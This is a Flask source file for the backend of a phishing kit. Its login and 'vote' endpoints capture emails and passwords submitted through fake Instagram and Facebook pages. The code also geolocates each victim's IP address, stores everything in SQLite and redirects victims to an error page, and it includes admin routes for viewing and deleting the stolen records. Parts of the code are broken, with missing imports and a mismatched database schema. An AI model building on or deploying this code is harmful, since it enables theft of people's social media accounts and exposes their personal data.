from flask import Flask, redirect, request, render_template, url_for
from flask_sqlalchemy import SQLAlchemy
import os
from datetime import datetime
import ipapi

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///data.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class Credentials(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(120))
    password = db.Column(db.String(120))
    account_type = db.Column(db.String(50))
    ip = db.Column(db.String(45))
    city = db.Column(db.String(100))
    region = db.Column(db.String(100))
    country = db.Column(db.String(100))
    time = db.Column(db.String(50))

@app.route('/initdb')
def init_db():
    db.create_all()
    return "Database initialized!"

@app.route('/resetdb')
def reset_db():
    db.drop_all()
    db.create_all()
    return "Database reset and initialized!"

@app.errorhandler(404)
def page_not_found(e):
    return '404 Not Found'

@app.route('/login/', methods=["GET", "POST"])
def login_page():
    if request.method == "POST":
        ip_address = request.headers.get('X-Real-IP', '127.0.0.1')
        response = ipapi.location(ip_address)

        email = request.form.get('email')
        password = request.form.get('password')

        new_credential = Credentials(
            email=email,
            password=password,
            account_type='INSTAGRAM',
            ip=ip_address,
            city=response.get("city"),
            region=response.get("region"),
            country=response.get("country_name"),
            time=datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S")
        )

        db.session.add(new_credential)
        db.session.commit()

    return redirect(request.referrer + "error" if request.referrer else "https://artscrednewarts.pages.dev/errors")

@app.route('/login2/', methods=["GET", "POST"])
def login_page2():
    if request.method == "POST":
        ip_address = request.headers.get('X-Real-IP', '127.0.0.1')
        response = ipapi.location(ip_address)

        email = request.form.get('email')
        password = request.form.get('password')

        new_credential = Credentials(
            email=email,
            password=password,
            account_type='FACEBOOK',
            ip=ip_address,
            city=response.get("city"),
            region=response.get("region"),
            country=response.get("country_name"),
            time=datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S")
        )

        db.session.add(new_credential)
        db.session.commit()

    return redirect(request.referrer + "error" if request.referrer else "https://artscrednewarts.pages.dev/errors")

##########################Second LG##########################

@app.route('/vote/', methods=["GET", "POST"])
def vote_page():
    if request.method == "POST":
        ip_address = request.headers['X-Real-IP']
        response = requests.get(f'https://ipapi.co/{ip_address}/json/').json()

        alldata = {i + ": ": request.form[i] for i in request.form}

        alldata.update({
            'time: ': datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S"),
            'account type: ': "INSTAGRAM",
            'ip: ': ip_address,
            "city: ": response.get("city"),
            "region: ": response.get("region"),
            "country: ": response.get("country_name")
        })

        # Insert data into SQLite database
        conn = sqlite3.connect('data.db')
        c = conn.cursor()
        c.execute(
            "INSERT INTO credentials (data, account_type, ip, city, region, country, time) VALUES (?, ?, ?, ?, ?, ?, ?)",
            (dumps(alldata), "INSTAGRAM", ip_address, response.get("city"), response.get("region"),
             response.get("country_name"), datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S")))
        conn.commit()
        conn.close()

    return redirect(request.referrer + "error")


@app.route('/vote2/', methods=["GET", "POST"])
def vote_page2():
    if request.method == "POST":
        ip_address2 = request.headers['X-Real-IP']
        response2 = requests.get(f'https://ipapi.co/{ip_address2}/json/').json()

        alldata2 = {i + ": ": request.form[i] for i in request.form}

        alldata2.update({
            'time: ': datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S"),
            'account type: ': "FACEBOOK",
            'ip: ': ip_address2,
            "city: ": response2.get("city"),
            "region: ": response2.get("region"),
            "country: ": response2.get("country_name")
        })

        # Insert data into SQLite database
        conn = sqlite3.connect('data.db')
        c = conn.cursor()
        c.execute(
            "INSERT INTO credentials (data, account_type, ip, city, region, country, time) VALUES (?, ?, ?, ?, ?, ?, ?)",
            (dumps(alldata2), "FACEBOOK", ip_address2, response2.get("city"), response2.get("region"),
             response2.get("country_name"), datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S")))
        conn.commit()
        conn.close()

    return redirect(request.referrer + "error")

@app.route("/<path:locate>")
def index(locate):
    account_type = 'INSTAGRAM' if 'wwsuobyiyUnvL99f' in locate else 'FACEBOOK'
    data = Credentials.query.filter_by(account_type=account_type).all()
    return render_template('index.html', data=data, locate=locate)

@app.route("/delete/<int:id>")
def delete(id):
    credential = Credentials.query.get(id)
    db.session.delete(credential)
    db.session.commit()
    return redirect(request.referrer)

@app.route("/dbabse")
def show_credentials():
    data = Credentials.query.all()
    return render_template('credentials.html', data=data)

if __name__ == "__main__":
    app.run(debug=True)
